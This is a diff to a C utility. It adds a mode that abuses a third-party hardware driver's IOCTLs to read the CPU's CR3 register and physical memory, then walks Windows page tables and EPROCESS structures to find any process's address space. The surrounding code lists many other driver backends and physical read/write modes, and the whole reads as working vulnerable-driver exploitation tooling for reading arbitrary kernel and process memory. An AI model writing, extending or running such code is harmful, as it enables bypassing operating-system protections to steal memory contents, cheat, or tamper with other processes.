@@ -1936,6 +1936,82 @@ static int mb_layer_read_va5(mb_phys_reader *r, uint64_t cr3, uint64_t va,
     return 1;
 }
 
+// ---------------------------------------------------------------------------
+// CCHWApi 2.9-only CR3 locator:
+//   1) IOCTL 0x80240020 kHWAPIReadControlReg -> current CR3 (register 3)
+//   2) use CCHWApi's physical-read IOCTL 0x8024003C as a page-table reader
+//   3) translate ntoskrnl VA -> read PsInitialSystemProcess -> walk EPROCESS
+// No physical RAM scan and no other kernel driver.
+// ---------------------------------------------------------------------------
+static int cchwapi_control_request(uint32_t cpu, uint32_t reg, uint8_t out[0x14]) {
+    if (!out) return 0;
+    memset(out, 0, 0x14);
+    *(uint32_t *)(out + 4) = cpu;
+    *(uint32_t *)(out + 8) = reg;
+    return 1;
+}
+
+static int cchwapi_read_control(HANDLE dev, uint32_t cpu, uint32_t reg, uint64_t *out) {
+    if (dev == INVALID_HANDLE_VALUE || !out) return 0;
+    uint8_t b[0x14];
+    DWORD ret = 0;
+    if (!cchwapi_control_request(cpu, reg, b)) return 0;
+    if (!DeviceIoControl(dev, 0x80240020u, b, sizeof(b), b, sizeof(b), &ret, NULL)) return 0;
+    *out = *(uint64_t *)(b + 0x0c);
+    return 1;
+}
+
+typedef struct { mb_phys_reader *pr; uint64_t cr3; } cchwapi_kr_ctx;
+
+static int cchwapi_kread(mb_kernel_reader *kr, uint64_t va, void *buf, uint32_t size) {
+    cchwapi_kr_ctx *ctx = (cchwapi_kr_ctx *)kr->ctx;
+    if (!ctx || !ctx->pr) return 0;
+    return mb_layer_read_va(ctx->pr, ctx->cr3, va, buf, size);
+}
+
+static int cchwapi_locate_cr3(uint32_t pid, const char *device, uint64_t *out_cr3, uint64_t *out_eproc) {
+    mb_phys_reader pr;
+    if (!reader_open(&pr, "cchwapi", device)) return 0;
+
+    uint64_t current_cr3 = 0;
+    if (!cchwapi_read_control(pr.dev, 0, 3, &current_cr3)) {
+        fprintf(stderr, "[ERR] cchwapi-only: ReadControlReg(CR3, cpu0) failed\n");
+        reader_close(&pr);
+        return 0;
+    }
+    fprintf(stderr, "[DBG] cchwapi-only: current CR3=0x%llX\n", (unsigned long long)current_cr3);
+
+    uint64_t nt_base = find_ntoskrnl_base();
+    if (!nt_base) { fprintf(stderr, "[ERR] cchwapi-only: ntoskrnl base not found\n"); reader_close(&pr); return 0; }
+    uint32_t rva = parse_nt_export_rva("PsInitialSystemProcess");
+    if (!rva) { fprintf(stderr, "[ERR] cchwapi-only: PsInitialSystemProcess RVA not found\n"); reader_close(&pr); return 0; }
+
+    cchwapi_kr_ctx ctx;
+    ctx.pr = &pr;
+    ctx.cr3 = current_cr3;
+    mb_kernel_reader kr;
+    kr.ctx = &ctx;
+    kr.read = cchwapi_kread;
+
+    uint64_t sys_eproc = 0;
+    if (!kr.read(&kr, nt_base + rva, &sys_eproc, 8)) {
+        fprintf(stderr, "[ERR] cchwapi-only: read PsInitialSystemProcess failed\n");
+        reader_close(&pr);
+        return 0;
+    }
+    if (sys_eproc < 0xFFFF800000000000ull) {
+        fprintf(stderr, "[ERR] cchwapi-only: bogus PsInitialSystemProcess=0x%llX\n",
+                (unsigned long long)sys_eproc);
+        reader_close(&pr);
+        return 0;
+    }
+
+    int ok = mb_layer_locate_cr3_kernel(&kr, sys_eproc, pid, 0x1D8, 0x1D0, 0x28,
+                                        out_cr3, out_eproc);
+    reader_close(&pr);
+    return ok;
+}
+
 static int hex_decode(const char *s, uint8_t *out, int max) {
     int n = 0;
     while (s && *s && n < max) {
@@ -2346,6 +2422,12 @@ static int selftest_mock(void) {
                     *(uint64_t *)(kkproc + 8) == 0x7FF600000000ull &&
                     *(uint64_t *)(kkproc + 16) == 0x12340000ull &&
                     *(uint64_t *)(kkproc + 24) == 0x40;
+    // CCHWApi control-register request layout (offline)
+    uint8_t cchreq[0x14];
+    int ok_cch = cchwapi_control_request(0, 3, cchreq) &&
+                 *(uint32_t *)(cchreq + 4) == 0 &&
+                 *(uint32_t *)(cchreq + 8) == 3;
+    check("定位层(locator)", "cchwapi control-register CR3 request layout (cpu0/reg3)", ok_cch);
     check("取数层(fetcher)", "kkyum direct process-read request layout (pid/src/dst/size)", ok_kkproc);
     check("取数层(fetcher)", "legacy backend registry (24 ids, find cchwapi_2_12, reject bad id)",
           legacy_count() == 24 && legacy_find("cchwapi_2_12") != NULL && legacy_find("bad;id") == NULL);
@@ -2495,6 +2577,7 @@ static void usage(void) {
     printf("  layers --locate --kkyum --pid <pid> [--kkyum-device <path>]   (kernel-VA locator; no physical reader needed)\n");
     printf("  layers --locate --kprl --pid <pid> [--kprl-device <path>]     (KPRL CR3-by-PID; no physical reader needed)\n");
     printf("  layers --locate --invary --pid <pid> [--invary-device <path>] (Invary Sensor kernel-VA locator)\n");
+    printf("  layers --locate --cchwapi-only --pid <pid> [--device \\\\.\\CCHWAPI]  (CCHWApi 2.9 only: control-reg CR3 + page-table walk, no scan)\n");
     printf("  layers --locate --scan-providers --pid <pid> [--auto-ranges | --scan-start <hex> --scan-size <hex>] [--va <hex> --size <n>]  (try 20 physical providers)\n");
     printf("  layers --locate --scan-bench --pid <pid> ...  (same, print per-provider open/scan timing)\n");
     printf("  layers --locate --scan-providers --scan-mock --pid 4242 --name MOCK.exe --scan-start 0x8000 --scan-size 0x1000 (offline provider-scan self-test)\n");
@@ -2513,7 +2596,7 @@ int main(int argc, char **argv) {
     int do_selftest = 0, do_read_phys = 0, do_write_phys = 0, do_explicit = 0, do_locate = 0, have_cr3 = 0, have_va = 0;
     int use_la57 = 0, do_translate_only = 0;
     const char *data_hex = NULL;
-    int do_ranges = 0, auto_ranges = 0, use_kkyum = 0, use_kprl = 0, use_invary = 0, use_auto = 0, use_scan_providers = 0, do_scan_bench = 0, do_invary_read = 0, do_read_process = 0, do_probe = 0, do_probe_loc = 0, do_probe_all = 0, do_list = 0, do_list_legacy = 0, do_hvci = 0;
+    int do_ranges = 0, auto_ranges = 0, use_kkyum = 0, use_kprl = 0, use_invary = 0, use_auto = 0, use_scan_providers = 0, use_cchwapi_only = 0, do_scan_bench = 0, do_invary_read = 0, do_read_process = 0, do_probe = 0, do_probe_loc = 0, do_probe_all = 0, do_list = 0, do_list_legacy = 0, do_hvci = 0;
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "--selftest-mock") == 0) do_selftest = 1;
         else if (strcmp(argv[i], "--probe-readers") == 0) do_probe = 1;
@@ -2550,6 +2633,7 @@ int main(int argc, char **argv) {
         else if (strcmp(argv[i], "--invary") == 0) use_invary = 1;
         else if (strcmp(argv[i], "--auto") == 0) use_auto = 1;
         else if (strcmp(argv[i], "--scan-providers") == 0) use_scan_providers = 1;
+        else if (strcmp(argv[i], "--cchwapi-only") == 0) use_cchwapi_only = 1;
         else if (strcmp(argv[i], "--scan-bench") == 0) { use_scan_providers = 1; do_scan_bench = 1; }
         else if (strcmp(argv[i], "--scan-mock") == 0) { use_scan_providers = 1; g_scan_mock = 1; }
         else if (strcmp(argv[i], "--invary-read") == 0) do_invary_read = 1;
@@ -2620,7 +2704,7 @@ int main(int argc, char **argv) {
         printf("VERDICT=PASS\n");
         return 0;
     }
-    if (!kind && !(do_locate && (use_kkyum || use_kprl || use_invary || use_auto || use_scan_providers))) {
+    if (!kind && !(do_locate && (use_kkyum || use_kprl || use_invary || use_auto || use_scan_providers || use_cchwapi_only))) {
         usage();
         return 6;
     }
@@ -2686,7 +2770,18 @@ int main(int argc, char **argv) {
         }
     } else if (do_locate) {
         uint64_t got_cr3 = 0, eproc = 0;
-        if (use_scan_providers && pid) {
+        if (use_cchwapi_only && pid) {
+            uint64_t c = 0, e = 0;
+            if (!cchwapi_locate_cr3(pid, device, &c, &e)) {
+                printf("[ERR] CCHWApi-only locator failed (pid=%u): driver/control-reg/page-walk error\n", pid);
+                rc = 5;
+            } else {
+                got_cr3 = c;
+                eproc = e;
+                printf("[OK] 定位层 cchwapi-only: PID=%u EPROCESS=0x%llX CR3=0x%llX (CCHWApi 2.9, no scan)\n",
+                       pid, (unsigned long long)eproc, (unsigned long long)got_cr3);
+            }
+        } else if (use_scan_providers && pid) {
             if (!name) name = "";
             mb_phys_reader sr;
             uint64_t sc = 0, se = 0;
